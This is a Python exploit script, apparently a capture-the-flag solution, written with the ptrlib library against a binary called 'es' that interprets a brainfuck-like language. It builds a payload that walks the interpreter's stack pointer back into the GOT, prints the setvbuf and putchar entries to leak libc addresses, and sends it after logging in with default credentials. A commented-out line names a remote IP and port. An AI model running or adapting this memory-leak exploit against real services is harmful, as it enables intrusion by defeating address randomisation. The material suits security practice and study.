from ptrlib import *

elf = ELF("./es")

def inc():
    return chr(0x61 + 0)
def dec():
    return chr(0x61 + 18)
def inc_sp():
    return chr(0x61 + 20)
def dec_sp():
    return chr(0x61 + 3)
def getchar():
    return chr(0x61 + 6)
def putchar():
    return chr(0x61 + 15)

sp = elf.symbol("stack")
got_setvbuf = elf.got("setvbuf")
got_putchar = elf.got("putchar")
dump("&stack = " + hex(sp))
dump("setvbuf@got = " + hex(got_setvbuf))
dump("putchar@got = " + hex(got_putchar))

payload = ""
payload += dec_sp() * (sp - got_setvbuf)
# leak <setvbuf>
for i in range(4):
    payload += putchar() + inc_sp()
for i in range(4):
    payload += inc_sp()
# leak <putchar>
for i in range(4):
    payload += putchar() + inc_sp()

#sock = Process("./es")
#sock = Socket("185.66.87.233", 5001)
sock = Socket("localhost", 5001)
#_ = input()
sock.recvuntil("Login: ")
sock.sendline("admin")
sock.recvuntil("Password: ")
sock.sendline("password")
sock.recvuntil("here: ")
sock.send(payload)

# leak <setvbuf>
addr = sock.recvonce(4)
if addr is None:
    dump("Bad luck!", "warning")
    exit(1)
addr_setvbuf = u64(addr)
dump("<setvbuf> = " + hex(addr_setvbuf))

# leak <putchar>
addr = sock.recvonce(4)
if addr is None:
    dump("Bad luck!", "warning")
    exit(1)
addr_putchar = u64(addr)
dump("<putchar> = " + hex(addr_putchar))

sock.close()
